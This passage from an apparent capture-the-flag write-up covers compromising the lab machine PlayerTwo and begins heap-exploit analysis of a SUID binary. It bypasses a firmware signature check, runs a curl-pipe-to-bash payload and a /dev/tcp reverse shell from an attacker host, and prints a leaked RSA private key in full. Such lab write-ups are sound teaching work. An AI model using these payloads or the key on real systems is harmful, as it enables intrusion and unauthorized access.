If I select the unmodified `.tar` file I downloaded, it shows a inaccurate path under the upload button. I don’t *think* that’s important at this time:

![image-20200122070725172](https://0xdfimages.gitlab.io/img/image-20200122070725172.png)

On hitting upload, I get a series of pop-ups. It’s made to look like the server is taking steps, but really, looking in Burp, I see it all came as one response to the POST:

```

HTTP/1.1 200 OK
Date: Wed, 22 Jan 2020 12:06:35 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 240
Connection: close
Content-Type: text/html; charset=UTF-8

<script>alert("Verifying signature of the firmware")</script><script>alert("It looks legit. Proceeding for provision test");</script><script>alert("All checks passed. Firmware is ready for deployment.");window.location="/protobs/";</script>

```

The three pop-ups happen sequentially, and then there’s a redirect to `/protobs/`. It This is reporting that once the signature check is successful, the firmware was executed somewhere.

### Firmware Upload

#### Upload Unmodified

In playing around with the upload feature, it was very common for the page to return a 500 error. So I decided to step back and take small steps towards uploading a modified firmware.

First I’ll try to make sure I can archive and upload without any modifications.

I created `unmod.tar` which has the same unmodified files:

```

root@kali# tar zcf unmod.tar info.txt Protobs.bin version 

```

The directory structure inside the `.tar` is important. This worked, and gave success pop-ups.

#### Modify Signature

I opened `Protobs.bin` in a Curses Hexedit (`hexeditor` in Kali) and changed the first byte of the signature from 0x56 to 0x00:

![image-20200122174643921](https://0xdfimages.gitlab.io/img/image-20200122174643921.png)

This should invalidate the signature. I rebuilt the archive, and uploaded:

![image-20200122174723557](https://0xdfimages.gitlab.io/img/image-20200122174723557.png)

#### Modify system Argument

My next thinking was to look at the error message when I left the signature but modified the file. I wanted the file to still run, so I changed something I knew wouldn’t break anything.

I put the signature value back, and went to the `stty raw -echo min 0 time 10` string. I changed the `10` to a `20`:

![image-20200122174920358](https://0xdfimages.gitlab.io/img/image-20200122174920358.png)

Much to my surprise, it passed the test entirely.

![image-20200122204854450](https://0xdfimages.gitlab.io/img/image-20200122204854450.png)

I’ll explore why in [Beyond Root](#signature-bypass), but basically the signature verification only signatures the start of the file.

### RCE

#### Strategy

Given that I can overwrite this string and it doesn’t break the signature, and that I suspect it’s being passed to `system`, I can execute whatever I want. The largest constraint is that I can’t make the command longer than the length of `stty raw -echo min 0 time 10`. Actually, looking at the hex dump above, I think I could actually overwrite the null there and continue into `stty sane` and five of the six nulls that follow it without breaking anything if the longer string is called first.

#### ping

I’ll start by trying to think of command I can run in 28 characters to test my theory. `ping` seems like a good test case:

![image-20200122205815988](https://0xdfimages.gitlab.io/img/image-20200122205815988.png)

I add it to a `.tar`, upload it, and watch `tcpdump`:

```

root@kali# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
20:58:48.055752 IP player2.htb > kali: ICMP echo request, id 46845, seq 1, length 64
20:58:48.055770 IP kali > player2.htb: ICMP echo reply, id 46845, seq 1, length 64

```

#### Shell

Now that I know I can execute, I’ll use `curl` to have PlayerTwo reach out to me for more code, and pipe that to shell. Here’s a payload that’s 25 characters long:

```

root@kali# echo -n "curl 10.10.14.11/s | bash" | wc -c
25

```

Update `Proto.bin`:

![image-20200122210251592](https://0xdfimages.gitlab.io/img/image-20200122210251592.png)

Repackage the `.tar`:

```

root@kali# rm mod.tar; tar zcf mod.tar info.txt Protobs.bin version 

```

I’ll also create a simple reverse shell Bash script named `s`:

```

#!/bin/bash

bash -i >& /dev/tcp/10.10.14.11/443 0>&1

```

Now start the Python webserver, and `nc` listener on 443. I’ll upload the `.tar`. First, I see the hit on the webserver:

```

root@kali# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.170 - - [22/Jan/2020 21:05:42] "GET /s HTTP/1.1" 200 -

```

Then a shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.170.
Ncat: Connection from 10.10.10.170:41146.
bash: cannot set terminal process group (1152): Inappropriate ioctl for device
bash: no job control in this shell
www-data@player2:/var/www/product/protobs$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

## Priv: www-data –> observer

### Enumeration

#### pspy

After a bunch of normal enumeration that didn’t spark anything for me, I upload [pspy](https://github.com/DominicBreuker/pspy) to look for crons. There’s definitely a bunch of stuff that runs every minute:

```

2020/01/23 11:27:01 CMD: UID=0    PID=2459   | sudo -u egre55 -s /bin/sh -c /usr/bin/php -S 0.0.0.0:8545 /var/www/main/server.php                                                                       
2020/01/23 11:27:01 CMD: UID=0    PID=2458   | /usr/bin/python /root/connection.py 
2020/01/23 11:27:01 CMD: UID=0    PID=2457   | /bin/dash -p -c /usr/bin/python /root/broadcast.py 
2020/01/23 11:27:01 CMD: UID=0    PID=2456   | /bin/dash -p -c sudo -u egre55 -s /bin/sh -c "/usr/bin/php -S 0.0.0.0:8545 /var/www/main/server.php" 
2020/01/23 11:27:01 CMD: UID=0    PID=2455   | /bin/dash -p -c /usr/bin/python /root/connection.py 
2020/01/23 11:27:01 CMD: UID=0    PID=2454   | /usr/sbin/CRON -f 
2020/01/23 11:27:01 CMD: UID=0    PID=2453   | /usr/sbin/CRON -f 
2020/01/23 11:27:01 CMD: UID=0    PID=2452   | /usr/sbin/CRON -f 
2020/01/23 11:27:01 CMD: UID=0    PID=2460   | /usr/bin/python /root/broadcast.py 
2020/01/23 11:27:01 CMD: UID=1001 PID=2461   | /bin/dash -p -c \/bin\/sh -c \/usr\/bin\/php\ -S\ 0\.0\.0\.0\:8545\ \/var\/www\/main\/server\.php 
2020/01/23 11:27:01 CMD: UID=1001 PID=2462   | /bin/dash -p -c \/bin\/sh -c \/usr\/bin\/php\ -S\ 0\.0\.0\.0\:8545\ \/var\/www\/main\/server\.php 
2020/01/23 11:27:01 CMD: UID=1001 PID=2463   | /usr/bin/php -S 0.0.0.0:8545 /var/www/main/server.php 
2020/01/23 11:27:01 CMD: UID=0    PID=2464   | /usr/bin/python /root/broadcast.py 
2020/01/23 11:27:01 CMD: UID=0    PID=2465   | 

```

These processes can be sorted into a couple of groups:
- The `CRON` processes itself.
- Several related to restarting `server.php` on 8545 as egre55. This is the Twirp API from earlier. I’ll play with that in [Beyond Root](#serverphp).
- Two unknown Python scripts in `/root/` running as root: `connection.py` and `broadcast.py`.

The word broadcast suggested that maybe I should be listening for traffic somewhere. I tried `tcpdump` but it wasn’t installed.

#### Port 1833

I took another look at the `netstat`:

```

www-data@player2:/var/www/product/protobs$ netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:1883          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8545            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -  

```

I can account for 3306 (local database, creds in the webserver directories, checked it out during enumeration but didn’t find anything), 53 (DNS, not uncommon localhost listener on Linux), 22 (SSH), 80 (HTTP), and 8545 (Twirp). That leaves 1883 unaccounted for.

I first just used `curl` and `nc` to connect to it directly. Neither returned anything (the “df” + newline on `nc` was me, and then it just returned):

```

www-data@player2:/var/www/product/protobs$ nc localhost 1883  

df
www-data@player2:/var/www/product/protobs$ curl localhost:1883
curl: (56) Recv failure: Connection reset by peer

```

I uploaded `chisel` to [create a tunnel](/cheatsheets/chisel) so I could scan it with `nmap`. I’ll run as server on my kali box and client on PlayerTwo:

```

root@kali:/opt/chisel# ./chisel server -p 8000 -reverse
2020/01/24 06:29:04 server: Reverse tunnelling enabled
2020/01/24 06:29:04 server: Fingerprint f4:91:8b:ac:f4:5d:6c:6f:c5:04:7d:07:6c:13:09:4a
2020/01/24 06:29:04 server: Listening on 0.0.0.0:8000...
2020/01/24 06:29:23 server: proxy#1:R:0.0.0.0:1883=>127.0.0.1:1883: Listening

```

```

www-data@player2:/dev/shm$ chmod +x chisel 
<./chisel client 10.10.14.11:8000 R:1883:127.0.0.1:1883                      
2020/01/24 11:29:55 client: Connecting to ws://10.10.14.11:8000
2020/01/24 11:29:55 client: Fingerprint f4:91:8b:ac:f4:5d:6c:6f:c5:04:7d:07:6c:13:09:4a
2020/01/24 11:29:55 client: Connected (Latency 15.765675ms)

```

Now I can run `nmap` against my local 1883 and get the results from 1883 on PlayerTwo:

```

root@kali# nmap -sC -sV -p 1883 127.0.0.1
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-24 06:30 EST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000063s latency).

PORT     STATE SERVICE VERSION
1883/tcp open  mqtt
|_mqtt-subscribe: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.62 seconds

```

It is an instance of the [MQTT](http://mqtt.org/) , a machine-to-machine connectivity protocol designed to provide lightweight public/subscript messaging.

### MQTT

Luckily for me, I had just recently completed a [challenge involving MQTT](/hackvent2019/hard#day-15) in Hackvent 2019. I grabbed the code I used for that challenge, and chopped out the password and transport, basically resetting it to the default connect. After updating the port/ip, I had the following:

```

#!/usr/bin/env python3

from datetime import datetime
import paho.mqtt.client as mqtt

def on_connect(mqttc, obj, flags, rc):
    print(f"Connecting")
    print("rc: " + str(rc))

def on_message(mqttc, obj, msg):
    print(f"[{datetime.now()}] {msg.topic} {str(msg.qos)} {str(msg.payload.decode())}")
    mqttc.loop_stop()

client = mqtt.Client()
client.on_connect = on_connect
client.on_message = on_message
client.connect("127.0.0.1", 1883, 60, "")
client.subscribe(f"#")
try:
    client.loop_forever()
except KeyboardInterrupt:
    print()

```

Running this, it connects, and returns (relatively useless) messages, I suspect from `broadcast.py`, once a minute:

```

root@kali# ./mqtt.py 
Connecting
rc: 0
[2020-01-24 07:06:29.447359] broadcast 0 Checking product status.
[2020-01-24 07:06:30.449166] broadcast 0 Protobs seems alright.
[2020-01-24 07:06:31.450434] broadcast 0 Checking for firmware updates.
[2020-01-24 07:06:32.451550] broadcast 0 Seems no updates yet.
[2020-01-24 07:06:33.453660] broadcast 0 Checking for Signing issues.
[2020-01-24 07:06:34.455004] broadcast 0 Status : No issues yet.
[2020-01-24 07:07:29.508888] broadcast 0 Checking product status.
[2020-01-24 07:07:30.510518] broadcast 0 Protobs seems alright.
[2020-01-24 07:07:31.511797] broadcast 0 Checking for firmware updates.
[2020-01-24 07:07:32.512938] broadcast 0 Seems no updates yet.
[2020-01-24 07:07:33.513934] broadcast 0 Checking for Signing issues.
[2020-01-24 07:07:34.516440] broadcast 0 Status : No issues yet.

```

Remembering a trick from Hackvent, I switched the subscription to the System Topics:

```

client.subscribe(f"$SYS/#")

```

Once I did that, a bunch of new messages come through. There are all sorts of channels, but once a minute, there are messages to `$SYS/internal/firmware/signing` printed:

```

[2020-01-24 07:10:28.936335] $SYS/internal/firmware/signing 0 Retrieving the key from aws instance
[2020-01-24 07:10:29.938045] $SYS/internal/firmware/signing 0 Key retrieved..
[2020-01-24 07:10:30.939596] $SYS/internal/firmware/signing 0 -----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA7Gc/OjpFFvefFrbuO64wF8sNMy+/7miymSZsEI+y4pQyEUBA        
R0JyfLk8f0SoriYk0clR/JmY+4mK0s7+FtPcmsvYgReiqmgESc/brt3hDGBuVUr4           
et8twwy77KkjypPy4yB0ecQhXgtJNEcEFUj9DrOq70b3HKlfu4WzGwMpOsAAdeFT       
+kXUsGy+Cp9rp3gS3qZ2UGUMsqcxCcKhn92azjFoZFMCP8g4bBXUgGp4CmFOtdvz           
SM29st5P4Wqn0bHxupZ0ht8g30TJd7FNYRcQ7/wGzjvJzVBywCxirkhPnv8sQmdE       
+UAakPZsfw16u5dDbz9JElNbBTvwO9chpYIs0QIDAQABAoIBAA5uqzSB1C/3xBWd 
62NnWfZJ5i9mzd/fMnAZIWXNcA1XIMte0c3H57dnk6LtbSLcn0jTcpbqRaWtmvUN     
wANiwcgNg9U1vS+MFB7xeqbtUszvoizA2/ScZW3P/DURimbWq3BkTdgVOjhElh6D             
62LlRtW78EaVXYa5bGfFXM7cXYsBibg1+HOLon3Lrq42j1qTJHH/oDbZzAHTo6IO         
91TvZVnms2fGYTdATIestpIRkfKr7lPkIAPsU7AeI5iAi1442Xv1NvGG5WPhNTFC            
gw4R0V+96fOtYrqDaLiBeJTMRYp/eqYHXg4wyF9ZEfRhFFOrbLUHtUIvkFI0Ya/Y        
QACn17UCgYEA/eI6xY4GwKxV1CvghL+aYBmqpD84FPXLzyEoofxctQwcLyqc5k5f            
llga+8yZZyeWB/rWmOLSmT/41Z0j6an0bLPe0l9okX4j8WOSmO6TisD4WiFjdAos        
JqiQej4Jch4fTJGegctyaOwsIVvP+hKRvYIwO9CKsaAgOQySlxQBOwMCgYEA7l+3  
JloRxnCYYv+eO94sNJWAxAYrcPKP6nhFc2ReZEyrPxTezbbUlpAHf+gVJNVdetMt      
ioLhQPUNCb3mpaoP0mUtTmpmkcLbi3W25xXfgTiX8e6ZWUmw+6t2uknttjti97dP
QFwjZX6QPZu4ToNJczathY2+hREdxR5hR6WrJpsCgYEApmNIz0ZoiIepbHchGv8T 
pp3Lpv9DuwDoBKSfo6HoBEOeiQ7ta0a8AKVXceTCOMfJ3Qr475PgH828QAtPiQj4
hvFPPCKJPqkj10TBw/a/vXUAjtlI+7ja/K8GmQblW+P/8UeSUVBLeBYoSeiJIkRf  
PYsAH4NqEkV2OM1TmS3kLI8CgYBne7AD+0gKMOlG2Re1f88LCPg8oT0MrJDjxlDI
NoNv4YTaPtI21i9WKbLHyVYchnAtmS4FGqp1S6zcVM+jjb+OpBPWHgTnNIOg+Hpt         
uaYs8AeupNl31LD7oMVLPDrxSLi/N5o1I4rOTfKKfGa31vD1DoCoIQ/brsGQyI6M     
zxQNDwKBgQCBOLY8aLyv/Hi0l1Ve8Fur5bLQ4BwimY3TsJTFFwU4IDFQY78AczkK 
/1i6dn3iKSmL75aVKgQ5pJHkPYiTWTRq2a/y8g/leCrvPDM19KB5Zr0Z1tCw5XCz
iZHQGq04r9PMTAFTmaQfMzDy1Hfo8kZ/2y5+2+lC7wIlFMyYze8n8g==                 
-----END RSA PRIVATE KEY-----  
[2020-01-24 07:10:31.716263] $SYS/internal/firmware/signing 0 Verifying signing..
[2020-01-24 07:10:32.717745] $SYS/internal/firmware/signing 0 Sent logs to apache server.

```

The script is getting a private SSH key ostensibly to get to AWS. I can exploit this further to leak the root flag, which I’ll show in [Beyond Root](#observer-roottxt-leak).

### SSH

That key works for SSH auth as observer:

```

root@kali# ssh -i ~/id_rsa_player2_observer observer@10.10.10.170
The authenticity of host '10.10.10.170 (10.10.10.170)' can't be established.
ECDSA key fingerprint is SHA256:qViniZV2YfFht35q9ia5soHJyZCxtMjJoydi4tSHZJ0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.170' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.2.5-050205-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Jan 24 11:43:16 UTC 2020

  System load:  0.0                Processes:            175
  Usage of /:   26.1% of 19.56GB   Users logged in:      0
  Memory usage: 26%                IP address for ens33: 10.10.10.170
  Swap usage:   0%
 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

121 packages can be updated.
5 updates are security updates.

Last login: Sun Dec  1 15:33:19 2019 from 172.16.118.129
observer@player2:~$

```

And now I finally have access to `user.txt`:

```

observer@player2:~$ cat user.txt
CDE09DC7************************

```

## Priv: observer –> root

### Enumeration

Now as observer I can access a new directory that’s owned by root, `/opt/Configuration_Utility`:

```

observer@player2:/opt$ ls -l
total 4
drwxr-x--- 2 root observer 4096 Nov 16 15:23 Configuration_Utility

observer@player2:/opt/Configuration_Utility$ ls -l
total 2156
-rwxr-xr-x 1 root root  179032 Nov 15 15:57 ld-2.29.so
-rwxr-xr-x 1 root root 2000480 Nov 15 15:57 libc.so.6
-rwsr-xr-x 1 root root   22440 Dec 17 13:41 Protobs

```

I’ll notice right away that `Protobs` is SUID and owned by root, so if I can get execution through it, that’ll be as root.

### Running Protobs

#### On Player2

Running the binary gives what looks like a new prompt:

```

observer@player2:/opt/Configuration_Utility$ ./Protobs 

[*] Protobs: Service booting up.
[*] Protobs: Fetching configs...

  ___         _       _       
 | _ \_ _ ___| |_ ___| |__ ___
 |  _/ '_/ _ \  _/ _ \ '_ (_-<
 |_| |_| \___/\__\___/_.__/__/
                              v1.0 Beta

protobs@player2:~$

```

However, if I enter something, it complains, and tells me to run `0` for options:

```

protobs@player2:~$ id

[!] Invalid option. Enter '0' for available options.

```

On entering `0`, I see a menu for listing, creating, reading, and deleting “configurations”:

```

protobs@player2:~$ 0

==Options=========
 1 -> List Available Configurations
 2 -> Create New Configuration
 3 -> Read a Configuration
 4 -> Delete a Configuration
 5 -> Exit Service
==================

```

I can create a configuration and then read it back:

```

protobs@player2:~$ 2

==New Game Configuration
 [ Game                ]: test
 [ Contrast            ]: 1
 [ Gamma               ]: 2
 [ Resolution X-Axis   ]: 3
 [ Resolution Y-Axis   ]: 4
 [ Controller          ]: 5
 [ Size of Description ]: 10
 [ Description         ]: descript

protobs@player2:~$ 1

==List of Configurations
 [00] : test

protobs@player2:~$ 3

==Read Game Configuration
 >>> Run the list option to see available configurations.
 [ Config Index    ]: 0
  [ Game                ]: test
  [ Contrast            ]: 1
  [ Gamma               ]: 2
  [ Resolution X-Axis   ]: 3
  [ Resolution Y-Axis   ]: 4
  [ Controller          ]: 5
  [ Description         ]: descript

```

Right away, this is screaming heap exploitation. CTF heap exploits problems always seem to take the format of menu with options to create, read, delete. It is also letting me pass the size of a buffer in, which is not a good sign.

#### Locally

I transferred the binary (along with the two libraries in the same folder) to my local box for further analysis, and to my surprise, when I tried to run it, it fails:

```

root@kali# ls
ld-2.29.so  libc.so.6  Protobs
root@kali# ./Protobs 
-bash: ./Protobs: No such file or directory

```

`ldd` shows the issue, as it’s looking `ld` (the linker) at a hardcoded path in `/opt` that doesn’t exist on my computer:

```

root@kali# ldd Protobs 
        linux-vdso.so.1 (0x00007fff3a9d6000)
        libc.so.6 (0x00007ff91b1d4000)
        /opt/Configuration_Utility/ld-2.29.so => /lib64/ld-linux-x86-64.so.2 (0x00007ff91b3c1000)

```

On a normal elf (for example, the `garbage` binary from [Ellingson](/2019/10/19/htb-ellingson.html#priv-margo--root)), that looks like this:

```

root@kali# ldd garbage
        linux-vdso.so.1 (0x00007ffcc93f3000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f51916a5000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f5191896000)

```

The interpreter (`ld` for ELF binaries) is specified as part of the ELF itself. I can see this more plainly with `patchelf` (`apt install patchelf`):

```

root@kali# patchelf --print-interpreter garbage
/lib64/ld-linux-x86-64.so.2
root@kali# patchelf --print-interpreter Protobs 
/opt/Configuration_Utility/ld-2.29.so

```

I can change to the lib in the same directory, and now it runs:

```

root@kali# patchelf --set-interpreter ld-2.29.so Protobs 
root@kali# patchelf --print-interpreter Protobs 
ld-2.29.so
root@kali# ./Protobs 

[*] Protobs: Service booting up.
[*] Protobs: Fetching configs...

  ___         _       _       
 | _ \_ _ ___| |_ ___| |__ ___
 |  _/ '_/ _ \  _/ _ \ '_ (_-<
 |_| |_| \___/\__\___/_.__/__/
                              v1.0 Beta

protobs@player2:~$

```

Alternatively, I could just moved the library to the hardcoded path in `/opt` and that would have worked too.

### Initial Static Analysis

#### General Structure

I opened it in Ghidra, and found a big grouping of functions starting with `FUN_0040`. I walked through them one by one, looking at the decompilation and assigning variable names and function names. Once I do that, the program call graph looks like this:

![image-20200130103723604](https://0xdfimages.gitlab.io/img/image-20200130103723604.png)

I can see there’s some printing and sleeping on start, and then the main prompt, which calls the function based on what I enter, and then returns to loop.

If I look at the `print_configs` function, I can see how the configs are managed in memory:

```

  puts("==List of Configurations");
  i = 0;
  while (i < 0xf) {
    if (*(long *)(&config_array + (ulong)i * 8) != 0) {
      printf(" [%02u] : %s\n",(ulong)i,*(undefined8 *)(&config_array + (ulong)i * 8));
    }
    i = i + 1;
  }

```

There’s an array (I’ve named `config_array`) that holds the configs, and in this loop, it goes from 0 to 14, and if the value in the config array for that index is not 0, it prints the index and uses the non-zero value as a pointer to a string.

So pointers to between 0 and 15 configurations are stored in this global array, and the first thing in the configuration is a string.

#### Protections

Checksec shows that I have to contend with canaries (I see that in the decompile output at the start and end of each function) as well as NX:

```

root@kali# checksec Protobs
[*] '/media/sf_CTFs/hackthebox/player2-10.10.10.170/binary/Protobs'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fd000)
    RUNPATH:  b'/opt/Configuration_Utility'

```

That basically rules out some kind of buffer overflow (I can’t brute force the canary like in [Rope](/2020/05/23/htb-rope.html) because it’ll be different on each run, whereas in Rope it was set when the program started, and each attempt was just in a forked process where the canary would be the same). But since I’m already thinking heap exploit, that’s ok.

I can also see that ASLR is enabled on Player2:

```

observer@player2:~$ cat /proc/sys/kernel/randomize_va_space 
2

```

This means that library functions will be at unknown addresses, and I’ll need a leak if I want to call and functions that weren’t already referenced in the binary (like `system`).

### Debugging

#### How I Debug

Now that I understand the basic structure of the program, I will spend some time in `gdb` looking at how different parts work, and how the memory is written. It’s hard to show that in a blog post, but becoming familiar with the program and how it stores things is key.

Since I think this is likely a heap exploit, I have a way that I like to debug. I’ll create a Python script using PwnTools (for Python3 this fork works well: `python3 -m pip install --upgrade git+https://github.com/Gallopsled/pwntools.git@dev3`) that will run the binary, and then functions that do the various menu options, and include a call to the Python debugger (`pdb`) after that. Once that hits, I’ll attach `gdb` to the binary process for debugging, and then use the `pdb` window to interact with it, allowing me to easily play with different kinds of input to pass to the program.

The binary is stripped, but PIE isn’t enabled, which means the main code will be at the same addresses every time, and that I can get addresses for functions easily out of IDA or Ghidra.

I’ll start with a basic script that interacts with the program:

```

#!/usr/bin/env python3

import pdb
from pwn import *

def new_config(name, dsize, desc):
    p.recvuntil('$ ')
    p.sendline('2')
    p.recvuntil(']: ')
    p.sendline(name)
    for i in range(5):
        p.recvuntil(']: ')
        p.sendline(f'{i}')
    p.recvuntil(']: ')
    p.sendline(f'{dsize}')
    p.recvuntil(']: ')
    p.send(desc)

def del_config(index):
    p.recvuntil('$ ')
    p.sendline('4')
    p.recvuntil(']: ')
    p.sendline(f'{index}')

def print_config(index):
    p.recvuntil('$ ')
    p.sendline('3')
    p.recvuntil(']: ')
    p.sendline(f'{index}')
    res = p.recvuntil('\n\n')
    return res

context(arch='amd64')
Protobs = ELF('./Protobs')
libc = ELF('./libc.so.6')

p = process(Protobs.path)
pdb.set_trace()

```

Now I’ll run it:

```

root@kali# python3 ./pwn_protobs.py 
[+] Starting local process './Protobs': pid 6490
--Return--
> /media/sf_CTFs/hackthebox/player2-10.10.10.170/binary/pwn_protobs.py(38)<module>()->None
-> pdb.set_trace()
(Pdb)  

```

Now I can, in a different pane, attach `gdb`:

```

root@kali# gdb -p $(pidof Protobs)

```

Now I can step through in `gdb`, and enter input or run functions from my script in the Python pane. I can also provide one or more `-ex "b *0x400e94"` flags to the `gdb` invocation to keep breakpoints so that I’m not having to enter breakpoints each time I start `gdb`.

There is a way to do the `gdb` through pwntools, but I’ve had mixed results there. I prefer just doing it myself.

#### Address of Config Pointers

Looking through the program, I can start to note interesting addresses that I’ll use later. The project here is loading the array of configs into `$rax`, which I can see `gdb` labels for me as 0x603060:

```

   0x401076:    lea    rdx,[rax*8+0x0]
=> 0x40107e:    lea    rax,[rip+0x201fdb]        # 0x603060
   0x401085:    mov    rax,QWORD PTR [rdx+rax*1]

```

#### Fix heapinfo

A useful tool in gdb [pwngdb](https://github.com/scwuaptx/Pwngdb) (or I’m sure [gef](https://github.com/hugsy/gef) has something similar) is printing out the current heap with a command `heapinfo`. However, when I try to run it here, I get an error:

```

gdb-peda$ heapinfo
Cannot get main_arena's symbol address. Make sure you install libc debug file (libc6-dbg & libc6-dbg:i386 for debian package).
Can't find heap info

```

I can install the debug files, but that installs debug symbols in the glibc for the system I’m on. But in this case, I’m using the local glibc from Player2. [This GitHub post](https://github.com/Naetw/CTF-pwn-tips/pull/7/files) gives the basics on how to fix this. I’ll need to install `elfutils` with `apt install elfutils`. I’ll need to get the version of glibc, which I can see is 2.29:

```

root@kali# strings libc.so.6 | grep glibc
glibc 2.29
Fatal error: glibc detected an invalid stdio handle
Fatal glibc error: array index %zu not less than array length %zu
Fatal glibc error: invalid allocation buffer of size %zu
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.  

```

I’ll download the package that contains that version. I did a bit of poking around to find [this page](https://packages.ubuntu.com/disco/amd64/libc6-dbg/download) (which is now gone, but [this [page](https://answers.launchpad.net/ubuntu/+source/glibc/2.29-0ubuntu2/+build/16599428) still has it). What I get is a `.deb` file. This file has *tons* of files in it. I only want the libc. I found this trick to get one file out of a `.deb`:

```

root@kali# dpkg --fsys-tarfile libc6-dbg_2.29-0ubuntu2_amd64.deb | tar xOf - ./usr/lib/debug/lib/x86_64-linux-gnu/libc-2.29.so > libc-2.29.so

```

Now, I named the libc from Player2 `libc.so.6-orig`. Now I’ll use `eu-unstrip` to combine them:

```

root@kali# eu-unstrip libc.so.6-orig libc-2.29.so
root@kali# mv libc-2.29.so libc.so.6

```

The downloaded file is now the original plus debug symbols. I renamed it so that it would be used. Now when I debug:

```

gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x1dab430 (size : 0x20bd0) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0

```

### Spot the Bug

#### Static Analysis

In debugging and static analysis, the thing that jumped out is in the function I’ve named `create_config` in the Ghidra decompilation:

```

void create_config(void)

{
  char *config_ptr;
  long desc_buffer;
  int current_config;
  ulong variable_long;
  void *new_config_addr;
  ssize_t bytes_read;
  size_t len_truncated_input;
  long in_FS_OFFSET;
  int i;
  char char_buf [19];
  undefined char_buf_terminator;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  variable_long = find_next_empty_config_index();
  current_config = (int)variable_long;
  if (current_config < 0) {
    print_exit_error();
  }
  new_config_addr = malloc(0x38);
  *(void **)(&config_array + (long)current_config * 8) = new_config_addr;
  config_ptr = *(char **)(&config_array + (long)current_config * 8);
  putchar(10);
  puts("==New Game Configuration");
  printf(" [ Game                ]: ");
  fgets(char_buf,0x400,stdin);
  add_null_at_newline(char_buf);
  char_buf_terminator = 0;
  strncpy(config_ptr,char_buf,0x14);
  variable_long = print_prompt_read_long(" [ Contrast            ]: ");
  *(int *)(config_ptr + 0x14) = (int)variable_long;
  variable_long = print_prompt_read_long(" [ Gamma               ]: ");
  *(int *)(config_ptr + 0x18) = (int)variable_long;
  variable_long = print_prompt_read_long(" [ Resolution X-Axis   ]: ");
  *(int *)(config_ptr + 0x1c) = (int)variable_long;
  variable_long = print_prompt_read_long(" [ Resolution Y-Axis   ]: ");
  *(int *)(config_ptr + 0x20) = (int)variable_long;
  variable_long = print_prompt_read_long(" [ Controller          ]: ");
  *(int *)(config_ptr + 0x24) = (int)variable_long;
  variable_long = print_prompt_read_long(" [ Size of Description ]: ");
  *(int *)(config_ptr + 0x28) = (int)variable_long;
  if (*(int *)(config_ptr + 0x28) != 0) {
    printf(" [ Description         ]: ");
    bytes_read = read(0,char_buf,0x200);
    add_null_at_newline(char_buf);
                    /* If read more than size, add null at size */
    if (*(uint *)(config_ptr + 0x28) <= (uint)bytes_read) {
      char_buf[*(uint *)(config_ptr + 0x28)] = '\0';
    }
    new_config_addr = malloc((ulong)*(uint *)(config_ptr + 0x28));
    *(void **)(config_ptr + 0x30) = new_config_addr;
    desc_buffer = *(long *)(config_ptr + 0x30);
    i = 0;
    while( true ) {
      len_truncated_input = strlen(char_buf);
      if (len_truncated_input < (ulong)(long)i) break;
      *(char *)(i + desc_buffer) = char_buf[i];
      i = i + 1;
    }
  }
  putchar(10);
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

```

This function takes user input to create a config entry. It’s looking for ints in all but the game name, and the description. When this function starts, it creates a 0x38 (56) byte space on the heap (with `malloc`). Once it gets the size of the description field from the user, it then allocates another block on the heap of that size. That leaves the heap looking like (with the first `malloc` in red and the second in green):

![image-20200204214532760](https://0xdfimages.gitlab.io/img/image-20200204214532760.png)

It is possible to get the description to not immediately follow the main structure on the heap, but when adding to the end of the heap, or if there’s enough space for both, it will.

